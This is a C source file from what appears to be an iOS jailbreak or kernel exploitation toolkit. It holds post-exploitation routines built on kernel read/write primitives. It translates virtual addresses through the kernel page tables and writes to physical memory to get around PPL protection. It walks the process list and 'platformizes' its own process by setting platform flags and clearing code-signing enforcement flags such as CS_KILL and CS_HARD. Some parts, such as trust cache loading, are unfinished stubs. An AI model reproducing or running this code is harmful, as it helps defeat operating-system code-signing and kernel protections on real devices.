#include "util.h"
#include "offsets.h"
#include "physrw.h"
#include "gadgets.h"
#include <stdio.h>
#include <string.h>
#include <unistd.h>

extern uint64_t kread64(uint64_t addr);
extern uint32_t kread32(uint64_t addr);
extern void kwrite64(uint64_t addr, uint64_t val);
extern void kwrite32(uint64_t addr, uint32_t val);
extern void kwrite_buf(uint64_t addr, void *buf, size_t len);

uint64_t translate_virt_to_phys(uint64_t virt) {
    // Use kernel page tables to translate virtual→physical
    // cpu_ttep is the TTBR1_EL1 value (kernel page table base)
    uint64_t ttep = kread64(SLIDE(g_gadgets.cpu_ttep));
    if (!ttep) return 0;
    return translateAddr_inTTEP(ttep, virt);
}

bool kwrite_ppl(uint64_t virt_addr, void *buf, size_t len) {
    uint8_t *b = (uint8_t*)buf;
    while (len > 0) {
        uint64_t page = virt_addr & ~0x3FFFULL;
        uint64_t off = virt_addr & 0x3FFFULL;
        uint64_t chunk = 0x4000 - off;
        if (chunk > len) chunk = len;
        
        uint64_t phys = translate_virt_to_phys(page);
        if (!phys) return false;
        
        if (!physwrite(phys + off, b, chunk)) return false;
        
        virt_addr += chunk;
        b += chunk;
        len -= chunk;
    }
    return true;
}

bool platformize_proc(void) {
    uint64_t our_proc = find_our_proc();
    if (!our_proc) {
        printf("[-] Failed to find our proc!\n");
        return false;
    }
    
    // Set TF_PLATFORM (0x400) in task flags
    uint64_t task = kread_ptr(our_proc + 0x10);
    if (!task) return false;
    
    uint32_t flags = kread32(task + 0x3DC);
    flags |= 0x400; // TF_PLATFORM
    kwrite32(task + 0x3DC, flags);
    
    // Clear CS flags in proc_ro
    uint64_t proc_ro = kread_ptr(our_proc + 0x20);
    if (!proc_ro) return false;
    
    uint32_t csflags = kread32(proc_ro + 0x1C);
    csflags |= 0x04000000; // CS_PLATFORM_BINARY
    csflags &= ~0x3900;    // Clear CS_HARD|CS_KILL|CS_RESTRICT|CS_ENFORCEMENT|CS_REQUIRE_LV
    kwrite_ppl(proc_ro + 0x1C, &csflags, 4);
    
    printf("[+] Platformized!\n");
    return true;
}

uint64_t find_kernel_proc(void) {
    uint64_t allproc = kread64(SLIDE(g_gadgets.allproc));
    if (!allproc) return 0;
    
    uint64_t proc = kread64(allproc);
    while (proc) {
        if (kread32(proc + 0x68) == 0) return proc;
        proc = kread_ptr(proc); // next proc
    }
    return 0;
}

uint64_t find_our_proc(void) {
    uint64_t allproc = kread64(SLIDE(g_gadgets.allproc));
    if (!allproc) return 0;
    
    pid_t my_pid = getpid();
    uint64_t proc = kread64(allproc);
    while (proc) {
        if (kread32(proc + 0x68) == (uint32_t)my_pid) return proc;
        proc = kread_ptr(proc);
    }
    return 0;
}

void *map_physical_page(uint64_t phys_addr) {
    // Use IOSurface to map a physical page
    // This requires IOSurfaceCreate with IOSurfaceAddress
    return NULL; // TODO: implement via IOSurface phys map
}

bool tcload_file(const char *path) {
    // Load a trust cache file
    // This requires kcall to the trust cache loading function
    // For now, just report
    printf("[*] tcload not yet implemented (requires kcall)\n");
    return false;
}
